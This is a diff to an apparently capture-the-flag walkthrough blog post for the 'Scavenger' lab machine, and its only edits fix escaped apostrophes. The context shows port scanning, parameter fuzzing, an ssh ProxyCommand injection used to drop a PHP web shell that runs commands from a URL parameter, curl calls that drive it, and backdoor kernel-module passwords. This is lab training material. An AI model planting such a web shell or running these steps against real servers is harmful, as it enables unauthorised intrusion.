@@ -46,7 +46,7 @@ Discovered open port 43/tcp on 10.10.10.155
 Discovered open port 21/tcp on 10.10.10.155
 ```
 
-Hmm, interesting list of open ports. Let\'s do one better with `nmap` scanning the discovered ports to establish their services.
+Hmm, interesting list of open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.
 
 ```
 # nmap -n -v -Pn -p21,22,43,53,80 -A --reason -oN nmap.txt 10.10.10.155
@@ -156,7 +156,7 @@ SELECT domain from customers; [4]:
 [*] supersechosting.htb
 ```
 
-Let\'s do a zone transfer on all of them and add them to `/etc/hosts`.
+Let's do a zone transfer on all of them and add them to `/etc/hosts`.
 
 ### MantisBT Owned!
 
@@ -195,7 +195,7 @@ Filtered Requests: 80
 Requests/sec.: 19.93495
 ```
 
-Indeed, but there\'s no output. Perhaps we need to brute force the parameter?
+Indeed, but there's no output. Perhaps we need to brute force the parameter?
 
 ```
 # wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 20 --hh 0 http://sec03.rentahacker.htb/shell.php?FUZZ=id
@@ -240,7 +240,7 @@ curl -s \
 
 ### Hack the World!
 
-During enumeration of `ib01c03`\'s account, I saw an email responding to `rentahacker.htb` email about their site being defaced.
+During enumeration of `ib01c03`'s account, I saw an email responding to `rentahacker.htb` email about their site being defaced.
 
 <a class="image-popup">
 ![9d39fcbd.png](/assets/images/posts/scavenger-htb-walkthrough/9d39fcbd.png)
@@ -254,7 +254,7 @@ Armed with this credential, I was able to retrieve important information about t
 ![620ede25.png](/assets/images/posts/scavenger-htb-walkthrough/620ede25.png)
 </a>
 
-Among the information gathered by `supersechosting.htb` was a network packet capture. And in it lies the credentials to access PrestaShop\'s back office secret URL.
+Among the information gathered by `supersechosting.htb` was a network packet capture. And in it lies the credentials to access PrestaShop's back office secret URL.
 
 <a class="image-popup">
 ![30939915.png](/assets/images/posts/scavenger-htb-walkthrough/30939915.png)
@@ -274,7 +274,7 @@ While I was exploring the back office, I noticed something strange going on at t
 
 Long story short, the vulnerability arises because `rsh` is symbolic-linked to `ssh`. And the IMAP URL is passed to `ssh` in its entirety. That's why you see `-oProxyCommand` above.
 
-Let\'s do something similar like what happened to `ib01c03`—we `echo` a `shell.php` to the base directory.
+Let's do something similar like what happened to `ib01c03`—we `echo` a `shell.php` to the base directory.
 
 ```
 # echo 'echo "<?php echo shell_exec(\$_GET[0]); ?>" > ../shell.php' | base64 -w0 && echo
@@ -295,7 +295,7 @@ curl -s \
      "http://$HOST/shell.php?0=$CMD"
 ```
 
-The file `user.txt` is in `ib01c01`\'s home directory.
+The file `user.txt` is in `ib01c01`'s home directory.
 
 <a class="image-popup">
 ![8016b522.png](/assets/images/posts/scavenger-htb-walkthrough/8016b522.png)
@@ -464,7 +464,7 @@ The **magic** password `g0tR0ot` didn't work for me though.
 ![3810d064.png](/assets/images/posts/scavenger-htb-walkthrough/3810d064.png)
 </a>
 
-Maybe there\'s another **magic** password? I copied the loaded KVM to my machine and ran it through `r2`.
+Maybe there's another **magic** password? I copied the loaded KVM to my machine and ran it through `r2`.
 
 ```
 # ./ib01c01.sh "base64 ../.../root.ko" > root.ko.b64
@@ -474,7 +474,7 @@ Maybe there\'s another **magic** password? I copied the loaded KVM to my machine
 ![c3ced05c.png](/assets/images/posts/scavenger-htb-walkthrough/c3ced05c.png)
 </a>
 
-Looks like `g3tPr1v` could be the **magic** password. Let\'s give it a shot.
+Looks like `g3tPr1v` could be the **magic** password. Let's give it a shot.
 
 <a class="image-popup">
 ![d98b39e7.png](/assets/images/posts/scavenger-htb-walkthrough/d98b39e7.png)
